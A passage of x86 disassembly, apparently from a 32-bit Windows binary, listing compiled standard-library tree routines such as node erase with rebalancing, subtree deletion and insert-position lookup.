   147f6:	mov    eax,DWORD PTR [ebp+0x8]
   147f9:	pop    esi
   147fa:	mov    DWORD PTR [eax],ebx
   147fc:	pop    ebx
   147fd:	pop    ebp
   147fe:	ret    0x10
   14801:	int3   
   14802:	int3   
   14803:	int3   
   14804:	int3   
   14805:	int3   
   14806:	mov    edi,edi
   14808:	push   ebp
   14809:	mov    ebp,esp
   1480b:	push   ecx
   1480c:	push   ecx
   1480d:	push   ebx
   1480e:	push   esi
   1480f:	mov    DWORD PTR [ebp-0x4],ecx
   14812:	push   edi
   14813:	mov    edi,DWORD PTR [ebp+0xc]
   14816:	lea    ecx,[ebp+0xc]
   14819:	call   0x11534
   1481e:	mov    esi,DWORD PTR [edi]
   14820:	mov    eax,ds:0x7f8c8
   14825:	mov    ebx,edi
   14827:	mov    DWORD PTR [ebp-0x8],esi
   1482a:	cmp    esi,eax
   1482c:	jne    0x1484a
   1482e:	mov    esi,DWORD PTR [edi+0x8]
   14831:	mov    eax,DWORD PTR [ebx+0x4]
   14834:	mov    ecx,DWORD PTR [ebp-0x4]
   14837:	mov    DWORD PTR [esi+0x4],eax
   1483a:	mov    eax,DWORD PTR [ecx+0x4]
   1483d:	cmp    DWORD PTR [eax+0x4],edi
   14840:	jne    0x148bf
   14842:	mov    DWORD PTR [eax+0x4],esi
   14845:	jmp    0x148cd
   1484a:	mov    ecx,DWORD PTR [edi+0x8]
   1484d:	cmp    ecx,eax
   1484f:	je     0x14831
   14851:	push   ecx
   14852:	call   0x1140e
   14857:	mov    ebx,eax
   14859:	mov    esi,DWORD PTR [ebx+0x8]
   1485c:	cmp    ebx,edi
   1485e:	je     0x14831
   14860:	mov    eax,DWORD PTR [ebp-0x8]
   14863:	mov    DWORD PTR [eax+0x4],ebx
   14866:	mov    eax,DWORD PTR [edi]
   14868:	mov    DWORD PTR [ebx],eax
   1486a:	cmp    ebx,DWORD PTR [edi+0x8]
   1486d:	jne    0x14874
   1486f:	mov    DWORD PTR [esi+0x4],ebx
   14872:	jmp    0x1488b
   14874:	mov    eax,DWORD PTR [ebx+0x4]
   14877:	mov    DWORD PTR [esi+0x4],eax
   1487a:	mov    eax,DWORD PTR [ebx+0x4]
   1487d:	mov    DWORD PTR [eax],esi
   1487f:	mov    eax,DWORD PTR [edi+0x8]
   14882:	mov    DWORD PTR [ebx+0x8],eax
   14885:	mov    eax,DWORD PTR [edi+0x8]
   14888:	mov    DWORD PTR [eax+0x4],ebx
   1488b:	mov    eax,DWORD PTR [ebp-0x4]
   1488e:	mov    eax,DWORD PTR [eax+0x4]
   14891:	cmp    DWORD PTR [eax+0x4],edi
   14894:	jne    0x1489b
   14896:	mov    DWORD PTR [eax+0x4],ebx
   14899:	jmp    0x148a9
   1489b:	mov    eax,DWORD PTR [edi+0x4]
   1489e:	cmp    DWORD PTR [eax],edi
   148a0:	jne    0x148a6
   148a2:	mov    DWORD PTR [eax],ebx
   148a4:	jmp    0x148a9
   148a6:	mov    DWORD PTR [eax+0x8],ebx
   148a9:	mov    eax,DWORD PTR [edi+0x4]
   148ac:	mov    DWORD PTR [ebx+0x4],eax
   148af:	mov    eax,DWORD PTR [ebx+0x1c]
   148b2:	mov    ecx,DWORD PTR [edi+0x1c]
   148b5:	mov    DWORD PTR [ebx+0x1c],ecx
   148b8:	mov    DWORD PTR [edi+0x1c],eax
   148bb:	mov    ebx,edi
   148bd:	jmp    0x14920
   148bf:	mov    eax,DWORD PTR [edi+0x4]
   148c2:	cmp    DWORD PTR [eax],edi
   148c4:	jne    0x148ca
   148c6:	mov    DWORD PTR [eax],esi
   148c8:	jmp    0x148cd
   148ca:	mov    DWORD PTR [eax+0x8],esi
   148cd:	mov    eax,DWORD PTR [ecx+0x4]
   148d0:	mov    DWORD PTR [ebp-0x8],eax
   148d3:	cmp    DWORD PTR [eax],edi
   148d5:	jne    0x148f7
   148d7:	mov    edx,DWORD PTR [edi+0x8]
   148da:	cmp    edx,DWORD PTR ds:0x7f8c8
   148e0:	jne    0x148e9
   148e2:	mov    edx,DWORD PTR [edi+0x4]
   148e5:	mov    DWORD PTR [eax],edx
   148e7:	jmp    0x148f7
   148e9:	push   esi
   148ea:	call   0x1140e
   148ef:	mov    ecx,DWORD PTR [ebp-0x8]
   148f2:	mov    DWORD PTR [ecx],eax
   148f4:	mov    ecx,DWORD PTR [ebp-0x4]
   148f7:	mov    eax,DWORD PTR [ecx+0x4]
   148fa:	mov    DWORD PTR [ebp-0x8],eax
   148fd:	cmp    DWORD PTR [eax+0x8],edi
   14900:	jne    0x14920
   14902:	mov    ecx,DWORD PTR [edi]
   14904:	cmp    ecx,DWORD PTR ds:0x7f8c8
   1490a:	jne    0x14914
   1490c:	mov    ecx,DWORD PTR [edi+0x4]
   1490f:	mov    DWORD PTR [eax+0x8],ecx
   14912:	jmp    0x14920
   14914:	push   esi
   14915:	call   0x113ec
   1491a:	mov    ecx,DWORD PTR [ebp-0x8]
   1491d:	mov    DWORD PTR [ecx+0x8],eax
   14920:	xor    edi,edi
   14922:	inc    edi
   14923:	cmp    DWORD PTR [ebx+0x1c],edi
   14926:	jne    0x14a3d
   1492c:	jmp    0x149eb
   14931:	cmp    DWORD PTR [esi+0x1c],edi
   14934:	jne    0x14a3a
   1493a:	mov    eax,DWORD PTR [esi+0x4]
   1493d:	cmp    esi,DWORD PTR [eax]
   1493f:	jne    0x149b6
   14941:	mov    eax,DWORD PTR [eax+0x8]
   14944:	cmp    DWORD PTR [eax+0x1c],0x0
   14948:	jne    0x14962
   1494a:	mov    DWORD PTR [eax+0x1c],edi
   1494d:	mov    eax,DWORD PTR [esi+0x4]
   14950:	and    DWORD PTR [eax+0x1c],0x0
   14954:	push   DWORD PTR [esi+0x4]
   14957:	call   0x130ea
   1495c:	mov    eax,DWORD PTR [esi+0x4]
   1495f:	mov    eax,DWORD PTR [eax+0x8]
   14962:	mov    ecx,DWORD PTR [eax]
   14964:	cmp    DWORD PTR [ecx+0x1c],edi
   14967:	jne    0x14971
   14969:	mov    ecx,DWORD PTR [eax+0x8]
   1496c:	cmp    DWORD PTR [ecx+0x1c],edi
   1496f:	je     0x149e4
   14971:	mov    ecx,DWORD PTR [eax+0x8]
   14974:	cmp    DWORD PTR [ecx+0x1c],edi
   14977:	jne    0x14991
   14979:	mov    ecx,DWORD PTR [eax]
   1497b:	mov    DWORD PTR [ecx+0x1c],edi
   1497e:	mov    ecx,DWORD PTR [ebp-0x4]
   14981:	and    DWORD PTR [eax+0x1c],0x0
   14985:	push   eax
   14986:	call   0x13138
   1498b:	mov    eax,DWORD PTR [esi+0x4]
   1498e:	mov    eax,DWORD PTR [eax+0x8]
   14991:	mov    ecx,DWORD PTR [esi+0x4]
   14994:	mov    ecx,DWORD PTR [ecx+0x1c]
   14997:	mov    DWORD PTR [eax+0x1c],ecx
   1499a:	mov    ecx,DWORD PTR [esi+0x4]
   1499d:	mov    DWORD PTR [ecx+0x1c],edi
   149a0:	mov    eax,DWORD PTR [eax+0x8]
   149a3:	mov    ecx,DWORD PTR [ebp-0x4]
   149a6:	mov    DWORD PTR [eax+0x1c],edi
   149a9:	push   DWORD PTR [esi+0x4]
   149ac:	call   0x130ea
   149b1:	jmp    0x14a3a
   149b6:	mov    eax,DWORD PTR [eax]
   149b8:	cmp    DWORD PTR [eax+0x1c],0x0
   149bc:	jne    0x149d5
   149be:	mov    DWORD PTR [eax+0x1c],edi
   149c1:	mov    eax,DWORD PTR [esi+0x4]
   149c4:	and    DWORD PTR [eax+0x1c],0x0
   149c8:	push   DWORD PTR [esi+0x4]
   149cb:	call   0x13138
   149d0:	mov    eax,DWORD PTR [esi+0x4]
   149d3:	mov    eax,DWORD PTR [eax]
   149d5:	mov    ecx,DWORD PTR [eax+0x8]
   149d8:	cmp    DWORD PTR [ecx+0x1c],edi
   149db:	jne    0x149fc
   149dd:	mov    ecx,DWORD PTR [eax]
   149df:	cmp    DWORD PTR [ecx+0x1c],edi
   149e2:	jne    0x149fc
   149e4:	and    DWORD PTR [eax+0x1c],0x0
   149e8:	mov    esi,DWORD PTR [esi+0x4]
   149eb:	mov    ecx,DWORD PTR [ebp-0x4]
   149ee:	mov    eax,DWORD PTR [ecx+0x4]
   149f1:	cmp    esi,DWORD PTR [eax+0x4]
   149f4:	jne    0x14931
   149fa:	jmp    0x14a3a
   149fc:	mov    ecx,DWORD PTR [eax]
   149fe:	cmp    DWORD PTR [ecx+0x1c],edi
   14a01:	jne    0x14a1b
   14a03:	mov    ecx,DWORD PTR [eax+0x8]
   14a06:	mov    DWORD PTR [ecx+0x1c],edi
   14a09:	mov    ecx,DWORD PTR [ebp-0x4]
   14a0c:	and    DWORD PTR [eax+0x1c],0x0
   14a10:	push   eax
   14a11:	call   0x130ea
   14a16:	mov    eax,DWORD PTR [esi+0x4]
   14a19:	mov    eax,DWORD PTR [eax]
   14a1b:	mov    ecx,DWORD PTR [esi+0x4]
   14a1e:	mov    ecx,DWORD PTR [ecx+0x1c]
   14a21:	mov    DWORD PTR [eax+0x1c],ecx
   14a24:	mov    ecx,DWORD PTR [esi+0x4]
   14a27:	mov    DWORD PTR [ecx+0x1c],edi
   14a2a:	mov    eax,DWORD PTR [eax]
   14a2c:	mov    ecx,DWORD PTR [ebp-0x4]
   14a2f:	mov    DWORD PTR [eax+0x1c],edi
   14a32:	push   DWORD PTR [esi+0x4]
   14a35:	call   0x13138
   14a3a:	mov    DWORD PTR [esi+0x1c],edi
   14a3d:	lea    eax,[ebx+0xc]
   14a40:	push   eax
   14a41:	call   0x13484
   14a46:	push   ebx
   14a47:	call   0x1d9f8
   14a4c:	mov    eax,DWORD PTR [ebp-0x4]
   14a4f:	dec    DWORD PTR [eax+0xc]
   14a52:	mov    eax,DWORD PTR [ebp+0x8]
   14a55:	pop    ecx
   14a56:	mov    ecx,DWORD PTR [ebp+0xc]
   14a59:	pop    edi
   14a5a:	pop    esi
   14a5b:	mov    DWORD PTR [eax],ecx
   14a5d:	pop    ebx
   14a5e:	leave  
   14a5f:	ret    0x8
   14a62:	int3   
   14a63:	int3   
   14a64:	int3   
   14a65:	int3   
   14a66:	int3   
   14a67:	int3   
   14a68:	mov    edi,edi
   14a6a:	push   ebp
   14a6b:	mov    ebp,esp
   14a6d:	push   ebx
   14a6e:	push   esi
   14a6f:	push   edi
   14a70:	mov    edi,DWORD PTR [ebp+0x8]
   14a73:	mov    ebx,ecx
   14a75:	mov    esi,edi
   14a77:	cmp    edi,DWORD PTR ds:0x7f8c8
   14a7d:	je     0x14aa5
   14a7f:	push   DWORD PTR [esi+0x8]
   14a82:	mov    ecx,ebx
   14a84:	call   0x14a68
   14a89:	mov    esi,DWORD PTR [esi]
   14a8b:	lea    eax,[edi+0xc]
   14a8e:	push   eax
   14a8f:	call   0x13484
   14a94:	push   edi
   14a95:	call   0x1d9f8
   14a9a:	pop    ecx
   14a9b:	mov    edi,esi
   14a9d:	cmp    esi,DWORD PTR ds:0x7f8c8
   14aa3:	jne    0x14a7f
   14aa5:	pop    edi
   14aa6:	pop    esi
   14aa7:	pop    ebx
   14aa8:	pop    ebp
   14aa9:	ret    0x4
   14aac:	int3   
   14aad:	int3   
   14aae:	int3   
   14aaf:	int3   
   14ab0:	int3   
   14ab1:	int3   
   14ab2:	mov    edi,edi
   14ab4:	push   esi
   14ab5:	push   edi
   14ab6:	push   0x1
   14ab8:	xor    edi,edi
   14aba:	push   edi
   14abb:	mov    esi,ecx
   14abd:	call   0x139a6
   14ac2:	cmp    DWORD PTR ds:0x7f8d0,edi
   14ac8:	jne    0x14adf
   14aca:	mov    ecx,eax
   14acc:	mov    DWORD PTR ds:0x7f8d0,ecx
   14ad2:	mov    DWORD PTR [ecx],edi
   14ad4:	mov    ecx,DWORD PTR ds:0x7f8d0
   14ada:	xor    eax,eax
   14adc:	mov    DWORD PTR [ecx+0x8],edi
   14adf:	inc    DWORD PTR ds:0x7fa28
   14ae5:	cmp    eax,edi
   14ae7:	je     0x14af0
   14ae9:	push   eax
   14aea:	call   0x1d9f8
   14aef:	pop    ecx
   14af0:	push   edi
   14af1:	push   DWORD PTR ds:0x7f8d0
   14af7:	mov    ecx,esi
   14af9:	call   0x139a6
   14afe:	mov    DWORD PTR [esi+0xc],edi
   14b01:	mov    DWORD PTR [esi+0x4],eax
   14b04:	mov    DWORD PTR [eax],eax
   14b06:	mov    esi,DWORD PTR [esi+0x4]
   14b09:	pop    edi
   14b0a:	mov    DWORD PTR [esi+0x8],esi
   14b0d:	pop    esi
   14b0e:	ret    
   14b0f:	int3   
   14b10:	int3   
   14b11:	int3   
   14b12:	int3   
   14b13:	int3   
   14b14:	mov    edi,edi
   14b16:	push   ebp
   14b17:	mov    ebp,esp
   14b19:	push   ebx
   14b1a:	mov    ebx,DWORD PTR [ebp+0x8]
   14b1d:	mov    eax,DWORD PTR [ebx+0x4]
   14b20:	push   esi
   14b21:	push   edi
   14b22:	mov    esi,ecx
   14b24:	mov    edi,DWORD PTR [esi+0x4]
   14b27:	add    eax,0x4
   14b2a:	push   edi
   14b2b:	push   DWORD PTR [eax]
   14b2d:	call   0x13b3c
   14b32:	mov    DWORD PTR [edi+0x4],eax
   14b35:	mov    eax,DWORD PTR [ebx+0xc]
   14b38:	mov    edi,DWORD PTR [esi+0x4]
   14b3b:	mov    DWORD PTR [esi+0xc],eax
   14b3e:	mov    eax,DWORD PTR [edi+0x4]
   14b41:	cmp    eax,DWORD PTR ds:0x7f8bc
   14b47:	je     0x14b61
   14b49:	push   eax
   14b4a:	call   0x11210
   14b4f:	mov    DWORD PTR [edi],eax
   14b51:	mov    esi,DWORD PTR [esi+0x4]
   14b54:	push   DWORD PTR [esi+0x4]
   14b57:	call   0x111ee
   14b5c:	mov    DWORD PTR [esi+0x8],eax
   14b5f:	jmp    0x14b69
   14b61:	mov    DWORD PTR [edi],edi
   14b63:	mov    esi,DWORD PTR [esi+0x4]
   14b66:	mov    DWORD PTR [esi+0x8],esi
   14b69:	pop    edi
   14b6a:	pop    esi
   14b6b:	pop    ebx
   14b6c:	pop    ebp
   14b6d:	ret    0x4
   14b70:	int3   
   14b71:	int3   
   14b72:	int3   
   14b73:	int3   
   14b74:	int3   
   14b75:	int3   
   14b76:	mov    edi,edi
   14b78:	push   ebp
   14b79:	mov    ebp,esp
   14b7b:	push   edi
   14b7c:	mov    edi,DWORD PTR [ebp+0xc]
   14b7f:	cmp    DWORD PTR [ebp+0x8],edi
   14b82:	je     0x14b98
   14b84:	push   esi
   14b85:	mov    esi,DWORD PTR [ebp+0x10]
   14b88:	inc    DWORD PTR [esi]
   14b8a:	lea    ecx,[ebp+0x8]
   14b8d:	call   0x1385c
   14b92:	cmp    DWORD PTR [ebp+0x8],edi
   14b95:	jne    0x14b88
   14b97:	pop    esi
   14b98:	pop    edi
   14b99:	pop    ebp
   14b9a:	ret    
   14b9b:	int3   
   14b9c:	int3   
   14b9d:	int3   
   14b9e:	int3   
   14b9f:	int3   
   14ba0:	mov    edi,edi
   14ba2:	push   ebp
   14ba3:	mov    ebp,esp
   14ba5:	push   DWORD PTR [ebp+0xc]
   14ba8:	push   DWORD PTR [ebp+0x8]
   14bab:	call   0x13c36
   14bb0:	mov    eax,DWORD PTR [ebp+0x8]
   14bb3:	pop    ebp
   14bb4:	ret    0x8
   14bb7:	int3   
   14bb8:	int3   
   14bb9:	int3   
   14bba:	int3   
   14bbb:	int3   
   14bbc:	mov    edi,edi
   14bbe:	push   ebp
   14bbf:	mov    ebp,esp
   14bc1:	push   ecx
   14bc2:	push   esi
   14bc3:	mov    esi,ecx
   14bc5:	cmp    DWORD PTR [esi+0xc],0x0
   14bc9:	mov    ecx,DWORD PTR [ebp+0xc]
   14bcc:	je     0x14c06
   14bce:	mov    eax,DWORD PTR [esi+0x4]
   14bd1:	cmp    ecx,DWORD PTR [eax]
   14bd3:	jne    0x14c06
   14bd5:	cmp    DWORD PTR [ebp+0x10],eax
   14bd8:	jne    0x14c06
   14bda:	push   DWORD PTR [eax+0x4]
   14bdd:	mov    ecx,esi
   14bdf:	call   0x138ba
   14be4:	mov    ecx,DWORD PTR ds:0x7f8b8
   14bea:	mov    eax,DWORD PTR [esi+0x4]
   14bed:	mov    DWORD PTR [eax+0x4],ecx
   14bf0:	mov    eax,DWORD PTR [esi+0x4]
   14bf3:	and    DWORD PTR [esi+0xc],0x0
   14bf7:	mov    DWORD PTR [eax],eax
   14bf9:	mov    eax,DWORD PTR [esi+0x4]
   14bfc:	mov    DWORD PTR [eax+0x8],eax
   14bff:	mov    eax,DWORD PTR [esi+0x4]
   14c02:	mov    ecx,DWORD PTR [eax]
   14c04:	jmp    0x14c2b
   14c06:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c09:	je     0x14c2b
   14c0b:	push   edi
   14c0c:	mov    edi,ecx
   14c0e:	lea    ecx,[ebp+0xc]
   14c11:	call   0x112b6
   14c16:	push   edi
   14c17:	lea    eax,[ebp-0x4]
   14c1a:	push   eax
   14c1b:	mov    ecx,esi
   14c1d:	call   0x13d28
   14c22:	mov    ecx,DWORD PTR [ebp+0xc]
   14c25:	cmp    ecx,DWORD PTR [ebp+0x10]
   14c28:	jne    0x14c0c
   14c2a:	pop    edi
   14c2b:	mov    eax,DWORD PTR [ebp+0x8]
   14c2e:	mov    DWORD PTR [eax],ecx
   14c30:	pop    esi
   14c31:	leave  
   14c32:	ret    0xc
   14c35:	int3   
   14c36:	int3   
   14c37:	int3   
   14c38:	int3   
   14c39:	int3   
   14c3a:	mov    edi,edi
   14c3c:	push   ebp
   14c3d:	mov    ebp,esp
   14c3f:	push   ecx
   14c40:	push   ecx
   14c41:	push   esi
   14c42:	push   DWORD PTR [ebp+0x8]
   14c45:	lea    eax,[ebp-0x8]
   14c48:	push   eax
   14c49:	mov    esi,ecx
   14c4b:	call   0x13f80
   14c50:	and    DWORD PTR [ebp+0x8],0x0
   14c54:	lea    eax,[ebp+0x8]
   14c57:	push   eax
   14c58:	push   DWORD PTR [ebp-0x4]
   14c5b:	push   DWORD PTR [ebp-0x8]
   14c5e:	call   0x139ee
   14c63:	add    esp,0xc
   14c66:	push   DWORD PTR [ebp-0x4]
   14c69:	lea    eax,[ebp-0x4]
   14c6c:	push   DWORD PTR [ebp-0x8]
   14c6f:	mov    ecx,esi
   14c71:	push   eax
   14c72:	call   0x14bbc
   14c77:	mov    eax,DWORD PTR [ebp+0x8]
   14c7a:	pop    esi
   14c7b:	leave  
   14c7c:	ret    0x4
   14c7f:	int3   
   14c80:	int3   
   14c81:	int3   
   14c82:	int3   
   14c83:	int3   
   14c84:	mov    edi,edi
   14c86:	push   ebp
   14c87:	mov    ebp,esp
   14c89:	push   ecx
   14c8a:	push   ebx
   14c8b:	push   esi
   14c8c:	push   edi
   14c8d:	mov    edi,ecx
   14c8f:	mov    eax,DWORD PTR [edi+0x4]
   14c92:	mov    esi,DWORD PTR [eax+0x4]
   14c95:	mov    ebx,eax
   14c97:	mov    eax,ds:0x7f8bc
   14c9c:	mov    dl,0x1
   14c9e:	cmp    esi,eax
   14ca0:	je     0x14cbe
   14ca2:	mov    ecx,DWORD PTR [ebp+0xc]
   14ca5:	mov    ecx,DWORD PTR [ecx]
   14ca7:	cmp    ecx,DWORD PTR [esi+0xc]
   14caa:	mov    ebx,esi
   14cac:	setb   dl
   14caf:	test   dl,dl
   14cb1:	je     0x14cb7
   14cb3:	mov    esi,DWORD PTR [esi]
   14cb5:	jmp    0x14cba
   14cb7:	mov    esi,DWORD PTR [esi+0x8]
   14cba:	cmp    esi,eax
   14cbc:	jne    0x14ca7
   14cbe:	cmp    BYTE PTR [edi+0x8],0x0
   14cc2:	je     0x14cdf
   14cc4:	push   DWORD PTR [ebp+0xc]
   14cc7:	push   ebx
   14cc8:	push   esi
   14cc9:	lea    eax,[ebp+0xc]
   14ccc:	push   eax
   14ccd:	mov    ecx,edi
   14ccf:	call   0x14504
   14cd4:	mov    ecx,DWORD PTR [eax]
   14cd6:	mov    eax,DWORD PTR [ebp+0x8]
   14cd9:	mov    BYTE PTR [eax+0x4],0x1
   14cdd:	jmp    0x14d0e
   14cdf:	mov    ecx,ebx
   14ce1:	mov    DWORD PTR [ebp-0x4],ecx
   14ce4:	test   dl,dl
   14ce6:	je     0x14cfa
   14ce8:	mov    eax,DWORD PTR [edi+0x4]
   14ceb:	cmp    ebx,DWORD PTR [eax]
   14ced:	je     0x14cc4
   14cef:	lea    ecx,[ebp-0x4]
   14cf2:	call   0x12e80
   14cf7:	mov    ecx,DWORD PTR [ebp-0x4]
   14cfa:	mov    edx,DWORD PTR [ecx+0xc]
   14cfd:	mov    eax,DWORD PTR [ebp+0xc]
   14d00:	cmp    edx,DWORD PTR [eax]
   14d02:	jae    0x14d07
   14d04:	push   eax
   14d05:	jmp    0x14cc7
   14d07:	mov    eax,DWORD PTR [ebp+0x8]
   14d0a:	mov    BYTE PTR [eax+0x4],0x0
   14d0e:	pop    edi
   14d0f:	pop    esi
   14d10:	mov    DWORD PTR [eax],ecx
   14d12:	pop    ebx
   14d13:	leave  
   14d14:	ret    0x8
   14d17:	int3   
   14d18:	int3   
   14d19:	int3   
   14d1a:	int3   
   14d1b:	int3   
   14d1c:	mov    edi,edi
   14d1e:	push   ebp
   14d1f:	mov    ebp,esp
   14d21:	push   ecx
   14d22:	push   esi
   14d23:	mov    esi,ecx
   14d25:	cmp    DWORD PTR [esi+0xc],0x0
   14d29:	mov    ecx,DWORD PTR [ebp+0xc]
   14d2c:	je     0x14d66
   14d2e:	mov    eax,DWORD PTR [esi+0x4]
   14d31:	cmp    ecx,DWORD PTR [eax]
   14d33:	jne    0x14d66
   14d35:	cmp    DWORD PTR [ebp+0x10],eax
   14d38:	jne    0x14d66
   14d3a:	push   DWORD PTR [eax+0x4]
   14d3d:	mov    ecx,esi
   14d3f:	call   0x138fa
   14d44:	mov    ecx,DWORD PTR ds:0x7f8bc
   14d4a:	mov    eax,DWORD PTR [esi+0x4]
   14d4d:	mov    DWORD PTR [eax+0x4],ecx
   14d50:	mov    eax,DWORD PTR [esi+0x4]
   14d53:	and    DWORD PTR [esi+0xc],0x0
   14d57:	mov    DWORD PTR [eax],eax
   14d59:	mov    eax,DWORD PTR [esi+0x4]
   14d5c:	mov    DWORD PTR [eax+0x8],eax
   14d5f:	mov    eax,DWORD PTR [esi+0x4]
   14d62:	mov    ecx,DWORD PTR [eax]
   14d64:	jmp    0x14d8b
   14d66:	cmp    ecx,DWORD PTR [ebp+0x10]
   14d69:	je     0x14d8b
   14d6b:	push   edi
   14d6c:	mov    edi,ecx
   14d6e:	lea    ecx,[ebp+0xc]
   14d71:	call   0x12ec0
   14d76:	push   edi
   14d77:	lea    eax,[ebp-0x4]
   14d7a:	push   eax
   14d7b:	mov    ecx,esi
   14d7d:	call   0x14218
   14d82:	mov    ecx,DWORD PTR [ebp+0xc]
   14d85:	cmp    ecx,DWORD PTR [ebp+0x10]
   14d88:	jne    0x14d6c
   14d8a:	pop    edi
   14d8b:	mov    eax,DWORD PTR [ebp+0x8]
   14d8e:	mov    DWORD PTR [eax],ecx
   14d90:	pop    esi
   14d91:	leave  
   14d92:	ret    0xc
   14d95:	int3   
   14d96:	int3   
   14d97:	int3   
   14d98:	int3   
   14d99:	int3   
   14d9a:	mov    edi,edi
   14d9c:	push   ebp
   14d9d:	mov    ebp,esp
   14d9f:	push   ecx
   14da0:	push   ecx
   14da1:	push   esi
   14da2:	push   DWORD PTR [ebp+0x8]
   14da5:	lea    eax,[ebp-0x8]
   14da8:	push   eax
   14da9:	mov    esi,ecx
   14dab:	call   0x14470
   14db0:	and    DWORD PTR [ebp+0x8],0x0
   14db4:	lea    eax,[ebp+0x8]
   14db7:	push   eax
   14db8:	push   DWORD PTR [ebp-0x4]
   14dbb:	push   DWORD PTR [ebp-0x8]
   14dbe:	call   0x13a54
   14dc3:	add    esp,0xc
   14dc6:	push   DWORD PTR [ebp-0x4]
   14dc9:	lea    eax,[ebp-0x4]
   14dcc:	push   DWORD PTR [ebp-0x8]
   14dcf:	mov    ecx,esi
   14dd1:	push   eax
   14dd2:	call   0x14d1c
   14dd7:	mov    eax,DWORD PTR [ebp+0x8]
   14dda:	pop    esi
   14ddb:	leave  
   14ddc:	ret    0x4
   14ddf:	int3   
   14de0:	int3   
   14de1:	int3   
   14de2:	int3   
   14de3:	int3   
   14de4:	mov    edi,edi
   14de6:	push   ebp
   14de7:	mov    ebp,esp
   14de9:	push   ecx
   14dea:	push   ebx
   14deb:	push   esi
   14dec:	push   edi
   14ded:	mov    edi,ecx
   14def:	mov    eax,DWORD PTR [edi+0x4]
   14df2:	mov    esi,DWORD PTR [eax+0x4]
   14df5:	mov    ebx,eax
   14df7:	mov    eax,ds:0x7f8b8
   14dfc:	mov    dl,0x1
   14dfe:	cmp    esi,eax
   14e00:	je     0x14e1e
   14e02:	mov    ecx,DWORD PTR [ebp+0xc]
   14e05:	mov    ecx,DWORD PTR [ecx]
   14e07:	cmp    ecx,DWORD PTR [esi+0xc]
   14e0a:	mov    ebx,esi
   14e0c:	setb   dl
   14e0f:	test   dl,dl
   14e11:	je     0x14e17
   14e13:	mov    esi,DWORD PTR [esi]
   14e15:	jmp    0x14e1a
   14e17:	mov    esi,DWORD PTR [esi+0x8]
   14e1a:	cmp    esi,eax
   14e1c:	jne    0x14e07
   14e1e:	cmp    BYTE PTR [edi+0x8],0x0
   14e22:	je     0x14e3f
   14e24:	push   DWORD PTR [ebp+0xc]
   14e27:	push   ebx
   14e28:	push   esi
   14e29:	lea    eax,[ebp+0xc]
   14e2c:	push   eax
   14e2d:	mov    ecx,edi
   14e2f:	call   0x146b6
   14e34:	mov    ecx,DWORD PTR [eax]
   14e36:	mov    eax,DWORD PTR [ebp+0x8]
   14e39:	mov    BYTE PTR [eax+0x4],0x1
   14e3d:	jmp    0x14e6e
   14e3f:	mov    ecx,ebx
   14e41:	mov    DWORD PTR [ebp-0x4],ecx
   14e44:	test   dl,dl
   14e46:	je     0x14e5a
   14e48:	mov    eax,DWORD PTR [edi+0x4]
   14e4b:	cmp    ebx,DWORD PTR [eax]
   14e4d:	je     0x14e24
   14e4f:	lea    ecx,[ebp-0x4]
   14e52:	call   0x11276
   14e57:	mov    ecx,DWORD PTR [ebp-0x4]
   14e5a:	mov    edx,DWORD PTR [ecx+0xc]
   14e5d:	mov    eax,DWORD PTR [ebp+0xc]
   14e60:	cmp    edx,DWORD PTR [eax]
   14e62:	jae    0x14e67
   14e64:	push   eax
   14e65:	jmp    0x14e27
   14e67:	mov    eax,DWORD PTR [ebp+0x8]
   14e6a:	mov    BYTE PTR [eax+0x4],0x0
   14e6e:	pop    edi
   14e6f:	pop    esi
   14e70:	mov    DWORD PTR [eax],ecx
   14e72:	pop    ebx
   14e73:	leave  
   14e74:	ret    0x8
   14e77:	int3   
   14e78:	int3   
   14e79:	int3   
   14e7a:	int3   
   14e7b:	int3   
   14e7c:	mov    edi,edi
   14e7e:	push   ebp
   14e7f:	mov    ebp,esp
   14e81:	push   ecx
   14e82:	push   esi
   14e83:	mov    esi,ecx
   14e85:	cmp    DWORD PTR [esi+0xc],0x0
   14e89:	mov    ecx,DWORD PTR [ebp+0xc]
   14e8c:	je     0x14ec6
   14e8e:	mov    eax,DWORD PTR [esi+0x4]
   14e91:	cmp    ecx,DWORD PTR [eax]
   14e93:	jne    0x14ec6
   14e95:	cmp    DWORD PTR [ebp+0x10],eax
   14e98:	jne    0x14ec6
   14e9a:	push   DWORD PTR [eax+0x4]
   14e9d:	mov    ecx,esi
   14e9f:	call   0x14a68
   14ea4:	mov    ecx,DWORD PTR ds:0x7f8c8
   14eaa:	mov    eax,DWORD PTR [esi+0x4]
   14ead:	mov    DWORD PTR [eax+0x4],ecx
   14eb0:	mov    eax,DWORD PTR [esi+0x4]
   14eb3:	and    DWORD PTR [esi+0xc],0x0
   14eb7:	mov    DWORD PTR [eax],eax
   14eb9:	mov    eax,DWORD PTR [esi+0x4]
   14ebc:	mov    DWORD PTR [eax+0x8],eax
   14ebf:	mov    eax,DWORD PTR [esi+0x4]
   14ec2:	mov    ecx,DWORD PTR [eax]
   14ec4:	jmp    0x14eeb
   14ec6:	cmp    ecx,DWORD PTR [ebp+0x10]
   14ec9:	je     0x14eeb
   14ecb:	push   edi
   14ecc:	mov    edi,ecx
   14ece:	lea    ecx,[ebp+0xc]
   14ed1:	call   0x11534
   14ed6:	push   edi
   14ed7:	lea    eax,[ebp-0x4]
   14eda:	push   eax
   14edb:	mov    ecx,esi
   14edd:	call   0x14806
   14ee2:	mov    ecx,DWORD PTR [ebp+0xc]
   14ee5:	cmp    ecx,DWORD PTR [ebp+0x10]
   14ee8:	jne    0x14ecc
   14eea:	pop    edi
   14eeb:	mov    eax,DWORD PTR [ebp+0x8]
   14eee:	mov    DWORD PTR [eax],ecx
   14ef0:	pop    esi
   14ef1:	leave  
   14ef2:	ret    0xc
   14ef5:	int3   
   14ef6:	int3   
   14ef7:	int3   
   14ef8:	int3   
   14ef9:	int3   
   14efa:	mov    edi,edi
   14efc:	push   ebp
   14efd:	mov    ebp,esp
   14eff:	push   ecx
   14f00:	push   ecx
   14f01:	push   ebx
   14f02:	push   esi
   14f03:	mov    DWORD PTR [ebp-0x4],ecx
   14f06:	push   edi
   14f07:	mov    edi,DWORD PTR [ebp+0xc]
   14f0a:	lea    ecx,[ebp+0xc]
   14f0d:	call   0x12e4a
   14f12:	mov    esi,DWORD PTR [edi]
   14f14:	mov    eax,ds:0x7f8c0
   14f19:	mov    ebx,edi
   14f1b:	mov    DWORD PTR [ebp-0x8],esi
   14f1e:	cmp    esi,eax
   14f20:	jne    0x14f3e
   14f22:	mov    esi,DWORD PTR [edi+0x8]
   14f25:	mov    eax,DWORD PTR [ebx+0x4]
